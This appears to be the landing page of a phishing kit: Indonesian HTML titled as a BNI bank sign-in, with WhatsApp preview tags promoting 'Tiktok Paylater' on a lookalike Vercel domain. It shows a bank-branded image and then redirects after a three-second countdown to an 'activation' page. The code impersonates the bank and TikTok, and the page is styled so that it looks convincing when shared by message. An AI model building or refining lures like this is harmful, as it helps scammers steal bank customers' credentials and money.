<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masuk ke Word BNI</title>
    
    <!-- KODE AGAR TAMPILAN DI WHATSAPP LEBIH BAGUS -->
    <meta property="og:image" content="https://tiktokshop0.vercel.app/bni.jpg" />
    <meta property="og:title" content="Tiktok Paylater" />
    <meta property="og:description" content="Tiktok paylater fitur pembayaran Beli sekarang, bayar nanti yang memudahkan kamu berbelanja di TikTok Shop tanpa harus membayar penuh di awal, Pilih cicilan 3, 6, 9, atau 12 bulan sesuai keinginan mu !" />
    <meta property="og:url" content="https://tiktokshop0.vercel.app/" />

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #000000;
        }

        /* Style Gambar */
        #gambarPembuka {
            width: 100%;
            height: 100%;
            object-fit: contain; 
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }

        /* Style Angka Hitung Mundur */
      
        }
    </style>
</head>
<body>

    <img id="gambarPembuka" src="wordbni.jpg" alt="wordbni">
    <div id="timer">3</div> <!-- TAMBAHAN INI BIAR ANGKA MUNCUL -->

    <script>
        let waktu = 3;
        let timerDisplay = document.getElementById('timer');
        
        let hitungMundur = setInterval(function() {
            waktu--;
            timerDisplay.textContent = waktu;
            
            if(waktu <= 0) {
                clearInterval(hitungMundur);
                // Pindah ke halaman aktivasi.html
                window.location.href = "index1.html"; 
            }
        }, 1000);
    </script>

</body>
</html>
